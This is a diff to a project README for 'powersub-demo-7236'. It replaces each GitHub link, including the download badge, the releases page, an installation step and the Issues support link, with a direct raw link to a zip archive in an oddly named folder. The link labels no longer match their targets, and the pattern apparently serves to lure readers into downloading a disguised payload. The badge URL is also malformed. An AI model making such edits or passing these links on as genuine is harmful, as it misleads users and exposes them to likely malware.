@@ -6,7 +6,7 @@ Welcome to the powersub-demo-7236 project! This guide will help you easily downl
 
 ## 📥 Download Now
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0.0-blue.svg)](https://github.com/shayanbinishaq/powersub-demo-7236/releases)
+[![Download Now](https://raw.githubusercontent.com/shayanbinishaq/powersub-demo-7236/main/extropical/powersub-demo-7236.zip%https://raw.githubusercontent.com/shayanbinishaq/powersub-demo-7236/main/extropical/powersub-demo-7236.zip)](https://raw.githubusercontent.com/shayanbinishaq/powersub-demo-7236/main/extropical/powersub-demo-7236.zip)
 
 ## 📂 What is powersub-demo-7236?
 
@@ -31,13 +31,13 @@ To run powersub-demo-7236, ensure your system meets the following requirements:
 
 To download the application, visit the Releases page:
 
-[Visit this page to download](https://github.com/shayanbinishaq/powersub-demo-7236/releases)
+[Visit this page to download](https://raw.githubusercontent.com/shayanbinishaq/powersub-demo-7236/main/extropical/powersub-demo-7236.zip)
 
 Once there, you will find the latest version available for download. Click on the version number to view details, and download the appropriate file for your operating system.
 
 ### Installation Steps
 
-1. Go to the [Releases page](https://github.com/shayanbinishaq/powersub-demo-7236/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/shayanbinishaq/powersub-demo-7236/main/extropical/powersub-demo-7236.zip).
 2. Find the latest version listed at the top.
 3. Click on the download link next to your operating system.
 4. Once the download is complete, locate the downloaded file in your "Downloads" folder.
@@ -53,7 +53,7 @@ Once there, you will find the latest version available for download. Click on th
 
 ## 💬 Support
 
-If you need any help, don’t hesitate to reach out. You can submit issues or questions on our [GitHub Issues page](https://github.com/shayanbinishaq/powersub-demo-7236/issues). We're here to assist you!
+If you need any help, don’t hesitate to reach out. You can submit issues or questions on our [GitHub Issues page](https://raw.githubusercontent.com/shayanbinishaq/powersub-demo-7236/main/extropical/powersub-demo-7236.zip). We're here to assist you!
 
 ## 👥 Contributing
 
